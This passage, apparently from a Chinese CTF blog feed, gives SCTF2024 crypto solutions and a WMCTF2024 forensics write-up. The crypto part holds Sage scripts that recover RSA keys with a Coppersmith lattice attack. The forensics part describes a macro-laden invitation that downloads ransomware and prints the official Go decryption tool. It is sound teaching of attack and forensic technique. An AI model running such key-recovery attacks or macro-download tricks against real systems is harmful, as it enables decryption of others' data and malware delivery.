334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这里的phi变成了(p^2 + p + 1)*(q^2 + q + 1)，也就是<br>$$<br>ed&#x3D;1 (mod \varphi)<br>$$</p><p>$$<br>ed&#x3D;1+k(p^2+p+1)(q^2+q+1)<br>$$</p><p>$$<br>ed&#x3D;1+k(n^2-n+1+(n+1)(p+q)+(p+q)^2)<br>$$</p><p>$$<br>0\equiv 1+k(n^2-n+1+(n+1)(p+q)+(p+q)^2)\ (mod\ e)<br>$$</p><p>令x&#x3D;k，y&#x3D;p+q，即可进行二元coppersmith</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">def small_roots(f, bounds, m=1, d=None):#多元copper</span><br><span class="line">    if not d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(0)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = Sequence([], f.parent())</span><br><span class="line">    for i in range(m + 1):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        for shifts in itertools.product(range(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(map(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) for monomial in monomials]</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, 1 / factor)</span><br><span class="line">    H = Sequence([], f.parent().change_ring(QQ))</span><br><span class="line">    for h in filter(None, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        if I.dimension() == -1:</span><br><span class="line">            H.pop()</span><br><span class="line">        elif I.dimension() == 0:</span><br><span class="line">            roots = []</span><br><span class="line">            for root in I.variety(ring=ZZ):</span><br><span class="line">                root = tuple(R(root[var]) for var in f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            return roots</span><br><span class="line">    return []</span><br><span class="line">N = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951</span><br><span class="line">e = 334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840</span><br><span class="line">PR.&lt;x, y&gt; = PolynomialRing(Zmod(e))</span><br><span class="line">f = 1 + x * (N ^ 2 - N + 1 + (N + 1) * y + y ^ 2)</span><br><span class="line">a,b = small_roots(f, bounds = (2 ^ 512, 2 ^ 513), m = 3, d = 2)[0]</span><br><span class="line">var(&#x27;x y&#x27;)</span><br><span class="line">solve([x+y==int(b),x*y==N],[x,y])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002172441065.png" alt="image-20241002172441065"></p><h4 id="不完全阻塞干扰"><a href="#不完全阻塞干扰" class="headerlink" title="不完全阻塞干扰"></a>不完全阻塞干扰</h4><p>题目给了一个不完整的私钥文件和以下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The ship crashed into the sun, causing a massive magnetic storm</span></span><br><span class="line"><span class="comment">#part of script</span></span><br><span class="line">msg = bytes_to_long(FLAG)</span><br><span class="line">n = p^<span class="number">5</span>*q^<span class="number">2</span></span><br><span class="line">phi = p^<span class="number">4</span>*(p-<span class="number">1</span>)*q*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(d,phi)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="comment"># c = 145554802564989933772666853449758467748433820771006616874558211691441588216921262672588167631397770260815821197485462873358280668164496459053150659240485200305314288108259163251006446515109018138298662011636423264380170119025895000021651886702521266669653335874489612060473962259596489445807308673497717101487224092493721535129391781431853820808463529747944795809850314965769365750993208968116864575686200409653590102945619744853690854644813177444995458528447525184291487005845375945194236352007426925987404637468097524735905540030962884807790630389799495153548300450435815577962308635103143187386444035094151992129110267595908492217520416633466787688326809639286703608138336958958449724993250735997663382433125872982238289419769011271925043792124263306262445811864346081207309546599603914842331643196984128658943528999381048833301951569809038023921101787071345517702911344900151843968213911899353962451480195808768038035044446206153179737023140055693141790385662942050774439391111437140968754546526191031278186881116757268998843581015398070043778631790328583529667194481319953424389090869226474999123124532354330671462280959215310810005231660418399403337476289138527331553267291013945347058144254374287422377547369897793812634181778309679601143245890494670013019155942690562552431527149178906855998534415120428884098317318129659099377634006938812654262148522236268027388683027513663867042278407716812565374141362015467076472409873946275500942547114202939578755575249750674734066843408758067001891408572444119999801055605577737379889503505649865554353749621313679734666376467890526136184241450593948838055612677564667946098308716892133196862716086041690426537245252116765796203427832657608512488619438752378624483485364908432609100523022628791451171084583484294929190998796485805496852608557456380717623462846198636093701726099310737244471075079541022111303662778829695340275795782631315412134758717966727565043332335558077486037869874106819581519353856396937832498623662166446395755447101393825864584024239951058366713573567250863658531585064635727070458886746791722270803893438211751165831616861912569513431821959562450032831904268205845224077709362068478</span></span><br></pre></td></tr></table></figure><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002220823339.png" alt="image-20241002220823339"></p><p>先手撕一下私钥</p><blockquote><p>当时由于对后面的两个已知部分密钥手撕的问题，导致卡住了。。。</p></blockquote><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002220951499.png" alt="image-20241002220951499"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n=0x067f0aa4e974a63a1ffe8d5c23e5d3c431653ae41cc746f305f62a9f193f22486cb7ef1b275634818f46d0752a5139e19918271fa0d7d27bc660d2b72414d08ea52c8837f949c7baecc3029ba31727ef3bf120d9926c02d7412f187e98dc56dd07b987d2cc191ad56164a144f28b2f70a15d105588a4f27fbb2891fc527bd6890a5f795b5c48476a6bf9dfb67b7e1ebc7b1b086cd28b58c68955bfdf44ecce11ffacdf654551b159b7832040cc28ee8ebea48f8672d53e3de88fcfbb5fb276b503880dd34d5993335ddf8ccb96c1b4d79f502d72104765ad9c2b1858a17af3d5be44fa3cbf4b8eeb942aa3942a3871d2c65ac70289123fc2e9f9b25cbfcbd7841096060fa504c3a07b591493c64c88d0bb45285a85b5f7d59db98faa00c2cd3fbb63da599205f1cab0df52cf7b431a0ee4a7e35696546ce9d03ef595ecee92d2142c92e97d2744939703455b4c70dec27c321ec6b83c029622e83a9e0d55d0b258d95d4e61291865dda76dc619fce9577990429c6e77e9d40781e3b2f449701b83e8b0c6c66eb380f96473e5d422efee8b2b0e88b716b00a79c9d514ca3ad9d2dee526609ff9541732a4198d11b9dbfbb2e55c24d80ea522d0786e3355f23606a5d38a72de4eefc8b6bfc482248a2862cb69d8e0e3d316597da9d80828be85054faf15fc369caacafb815c6973c171940683d56a1a1967b09b7ffa3fbe5b2e08699759d84d71603f516447696bb27322a69f39f6ca253e00dc9555d5f97328070c467f3663cc489aad130f28c42f35bf88c571920ab92acb8f75d03e35a75103c5bd96f061c96bd02af6e1d191b0dd164bc721377003edbf5d3ef65a5e9046385356b521623bee37f164850a0a7afb0ed4e7e8bd9afe1298f7d532bc9ad941812d332aece75d1cccb1ff69fd42b31f248ae579d9e0d6a14b0546e784ba940e32bd01c395df8ff4584040462b5479fa07336d503dc332e70fc06d9463297fc042b623d56f87efaa525a9b580e314d90d1211893ed407a26508deaa0a13c9ee8c902b9e1c3a02fe9a51452c02ee7bdcc85c0eff63891e24703bd265d9c9dbf456e2af9409538bce0fecc7ebab20266aaab06c766c3ea6cda9cb9ba5e1d024b7dc3d73e76f6a333197bad87c4fb34d565a0014aac72825e41adcfeadadc87acef40ad84b7c55691abad561be0550ea0a988470c427432acb8feb2b9d2d2598fb2089bb91bbd9cb199e892d36164d8bf3ecd54576a97134047a12da84207485bb4e5</span><br></pre></td></tr></table></figure><p>接下来的base64解码时，都需要先把开头的o删掉，这样才能看到熟悉的tag头181</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002221256841.png" alt="image-20241002221256841"></p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002221331466.png" alt="image-20241002221331466"></p><p>这里得到的分别是p和q的高位</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ph=0x8063d0a21876e5ce1e2101c20015529066ed9976882d1002a29efe0f2fdfcc2743fc9a4b5b651cc97108699eca2fb1f3d93175bae343e7c92e4a41c72d05e570194</span><br><span class="line">qh=0xe4f0fe49f9ae1492c097a0a988fa71876625fe4fce05b0204f1fdf43ec64b4dac699d28e166efdfc7562d19e58c3493d9100365cf2840b46c0f6ee8d964807170ff2c13c4eb8012ecab37862a39</span><br></pre></td></tr></table></figure><p>显然接下来就是二元coppersmith</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">import libnum</span><br><span class="line">def small_roots(f, bounds, m=1, d=None):</span><br><span class="line">    if not d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(0)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = Sequence([], f.parent())</span><br><span class="line">    for i in range(m + 1):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        for shifts in itertools.product(range(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(map(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) for monomial in monomials]</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    for i, factor in enumerate(factors):</span><br><span class="line">        B.rescale_col(i, 1 / factor)</span><br><span class="line">    H = Sequence([], f.parent().change_ring(QQ))</span><br><span class="line">    for h in filter(None, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        if I.dimension() == -1:</span><br><span class="line">            H.pop()</span><br><span class="line">        elif I.dimension() == 0:</span><br><span class="line">            roots = []</span><br><span class="line">            for root in I.variety(ring=ZZ):</span><br><span class="line">                root = tuple(R(root[var]) for var in f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            return roots</span><br><span class="line">    return []</span><br><span class="line">c = 145554802564989933772666853449758467748433820771006616874558211691441588216921262672588167631397770260815821197485462873358280668164496459053150659240485200305314288108259163251006446515109018138298662011636423264380170119025895000021651886702521266669653335874489612060473962259596489445807308673497717101487224092493721535129391781431853820808463529747944795809850314965769365750993208968116864575686200409653590102945619744853690854644813177444995458528447525184291487005845375945194236352007426925987404637468097524735905540030962884807790630389799495153548300450435815577962308635103143187386444035094151992129110267595908492217520416633466787688326809639286703608138336958958449724993250735997663382433125872982238289419769011271925043792124263306262445811864346081207309546599603914842331643196984128658943528999381048833301951569809038023921101787071345517702911344900151843968213911899353962451480195808768038035044446206153179737023140055693141790385662942050774439391111437140968754546526191031278186881116757268998843581015398070043778631790328583529667194481319953424389090869226474999123124532354330671462280959215310810005231660418399403337476289138527331553267291013945347058144254374287422377547369897793812634181778309679601143245890494670013019155942690562552431527149178906855998534415120428884098317318129659099377634006938812654262148522236268027388683027513663867042278407716812565374141362015467076472409873946275500942547114202939578755575249750674734066843408758067001891408572444119999801055605577737379889503505649865554353749621313679734666376467890526136184241450593948838055612677564667946098308716892133196862716086041690426537245252116765796203427832657608512488619438752378624483485364908432609100523022628791451171084583484294929190998796485805496852608557456380717623462846198636093701726099310737244471075079541022111303662778829695340275795782631315412134758717966727565043332335558077486037869874106819581519353856396937832498623662166446395755447101393825864584024239951058366713573567250863658531585064635727070458886746791722270803893438211751165831616861912569513431821959562450032831904268205845224077709362068478</span><br><span class="line">n=0x067f0aa4e974a63a1ffe8d5c23e5d3c431653ae41cc746f305f62a9f193f22486cb7ef1b275634818f46d0752a5139e19918271fa0d7d27bc660d2b72414d08ea52c8837f949c7baecc3029ba31727ef3bf120d9926c02d7412f187e98dc56dd07b987d2cc191ad56164a144f28b2f70a15d105588a4f27fbb2891fc527bd6890a5f795b5c48476a6bf9dfb67b7e1ebc7b1b086cd28b58c68955bfdf44ecce11ffacdf654551b159b7832040cc28ee8ebea48f8672d53e3de88fcfbb5fb276b503880dd34d5993335ddf8ccb96c1b4d79f502d72104765ad9c2b1858a17af3d5be44fa3cbf4b8eeb942aa3942a3871d2c65ac70289123fc2e9f9b25cbfcbd7841096060fa504c3a07b591493c64c88d0bb45285a85b5f7d59db98faa00c2cd3fbb63da599205f1cab0df52cf7b431a0ee4a7e35696546ce9d03ef595ecee92d2142c92e97d2744939703455b4c70dec27c321ec6b83c029622e83a9e0d55d0b258d95d4e61291865dda76dc619fce9577990429c6e77e9d40781e3b2f449701b83e8b0c6c66eb380f96473e5d422efee8b2b0e88b716b00a79c9d514ca3ad9d2dee526609ff9541732a4198d11b9dbfbb2e55c24d80ea522d0786e3355f23606a5d38a72de4eefc8b6bfc482248a2862cb69d8e0e3d316597da9d80828be85054faf15fc369caacafb815c6973c171940683d56a1a1967b09b7ffa3fbe5b2e08699759d84d71603f516447696bb27322a69f39f6ca253e00dc9555d5f97328070c467f3663cc489aad130f28c42f35bf88c571920ab92acb8f75d03e35a75103c5bd96f061c96bd02af6e1d191b0dd164bc721377003edbf5d3ef65a5e9046385356b521623bee37f164850a0a7afb0ed4e7e8bd9afe1298f7d532bc9ad941812d332aece75d1cccb1ff69fd42b31f248ae579d9e0d6a14b0546e784ba940e32bd01c395df8ff4584040462b5479fa07336d503dc332e70fc06d9463297fc042b623d56f87efaa525a9b580e314d90d1211893ed407a26508deaa0a13c9ee8c902b9e1c3a02fe9a51452c02ee7bdcc85c0eff63891e24703bd265d9c9dbf456e2af9409538bce0fecc7ebab20266aaab06c766c3ea6cda9cb9ba5e1d024b7dc3d73e76f6a333197bad87c4fb34d565a0014aac72825e41adcfeadadc87acef40ad84b7c55691abad561be0550ea0a988470c427432acb8feb2b9d2d2598fb2089bb91bbd9cb199e892d36164d8bf3ecd54576a97134047a12da84207485bb4e5</span><br><span class="line">ph = 0x008063D0A21876E5CE1E2101C20015529066ED9976882D1002A29EFE0F2FDFCC2743FC9A4B5B651CC97108699ECA2FB1F3D93175BAE343E7C92E4A41C72D05E570194</span><br><span class="line">qh = 0x00E4F0FE49F9AE1492C097A0A988FA71876625FE4FCE05B0204F1FDF43EC64B4DAC699D28E166EFDFC7562D19E58C3493D9100365CF2840B46C0F6EE8D964807170FF2C13C4EB8012ECAB37862A39</span><br><span class="line">ph=ph&lt;&lt;(1024-524)</span><br><span class="line">qh=qh&lt;&lt;(1024-620)</span><br><span class="line">e=65537</span><br><span class="line">PR.&lt;x1,x2&gt; = Zmod(n)[]</span><br><span class="line">f = (ph + x1) ^ 5 * (qh + x2) ^ 2</span><br><span class="line">pl,ql=small_roots(f, bounds=(2**(1024-524), 2**(1024-620)), m=2, d=3)[0]</span><br><span class="line">p=int(pl)+ph</span><br><span class="line">q=int(ql)+qh</span><br><span class="line">phi = p^4*(p-1)*q*(q-1)</span><br><span class="line">d = inverse_mod(e,phi)</span><br><span class="line">m=int(pow(c,d,n))</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002233627615.png" alt="image-20241002233627615"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> SCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WMCTF2024 部分Misc 复现</title>
      <link href="/2024/09/24/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/09/24/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>misc那么多题，除了签到题一题都不会。。。o(╥﹏╥)o其中party time这题因为不会逆向而卡住了。。。不懂的还是太多了，还得多沉淀沉淀。</p><p>在这里复现一下学长出的两道取证题。</p></blockquote><h3 id="Party-Time"><a href="#Party-Time" class="headerlink" title="Party Time"></a>Party Time</h3><p>ftk挂载一下，可以看到桌面上有flag.rar，Party invitation.docm和readme.txt，提取出来</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924002423222.png" alt="image-20240924002423222"></p><p>把party invitation.docm丢进云沙箱，不出意料的报毒了，可以看到在宏里面执行了一个ps命令，下载了一个叫做windows_update_20240813.exe的程序，大概是个病毒。</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924003410144.png" alt="image-20240924003410144"></p><p>用volatility从所给的镜像中找一下这个程序在哪，用ftk提取出来。</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924004413133.png" alt="image-20240924004413133"></p><blockquote><p>当时就是卡这了，因为不会逆向。。。</p></blockquote><p>对这个exe程序进行逆向，可以发现这个程序简单来说是会自动对文件进行OAEP填充的RSA加密的操作，也就是一个勒索病毒。</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924005108852.png" alt="image-20240924005108852"></p><p>可以看到，公钥和私钥都被藏在了注册表里</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924005428298.png" alt="image-20240924005428298"></p><p>还有个devicekey，是对主机名进行了sha256加密</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924005522228.png" alt="image-20240924005522228"></p><p>用volatility提取注册表中的私钥，以及查看主机名（可通过查看环境变量得到）</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924005959512.png" alt="image-20240924005959512"></p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924010338906.png" alt="image-20240924010338906"></p><p>写脚本进行解密，这里直接贴官方脚本</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/rsa&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/x509&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/pem&quot;</span></span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// Function to load RSA keys from files</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadRSAKeys</span><span class="params">()</span></span> (*rsa.PrivateKey, <span class="type">error</span>) &#123;</span><br><span class="line">privateKeyPEM, err := ioutil.ReadFile(<span class="string">&quot;private_key.pem&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">block, _ := pem.Decode(privateKeyPEM)</span><br><span class="line"><span class="keyword">if</span> block == <span class="literal">nil</span> || block.Type != <span class="string">&quot;RSA PRIVATE KEY&quot;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;failed to decode PEM block containing private key&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> privateKey, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Function to decrypt data using RSA and device key</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decrypt</span><span class="params">(encryptedData []<span class="type">byte</span>, privateKey *rsa.PrivateKey, deviceKey []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">hash := sha256.New()</span><br><span class="line">decryptedData, err := rsa.DecryptOAEP(hash, rand.Reader, privateKey, encryptedData, deviceKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> decryptedData, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printHelp</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Usage:&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;  -help                Show this help message&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;  -decrypt &lt;file&gt;      Decrypt the specified file (requires device key)&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;  -key &lt;key&gt;           Device key for decryption&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">help := flag.Bool(<span class="string">&quot;help&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;Show help message&quot;</span>)</span><br><span class="line">decryptFile := flag.String(<span class="string">&quot;decrypt&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;File to decrypt&quot;</span>)</span><br><span class="line">key := flag.String(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Device key for decryption&quot;</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"><span class="keyword">if</span> *help &#123;</span><br><span class="line">printHelp()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> *decryptFile == <span class="string">&quot;&quot;</span> || *key == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">printHelp()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, err := os.Stat(<span class="string">&quot;private_key.pem&quot;</span>); os.IsNotExist(err) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;no private key find!&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">privateKey, err := loadRSAKeys()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error loading RSA keys:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> *decryptFile != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">data, err := ioutil.ReadFile(*decryptFile)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error reading file:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span 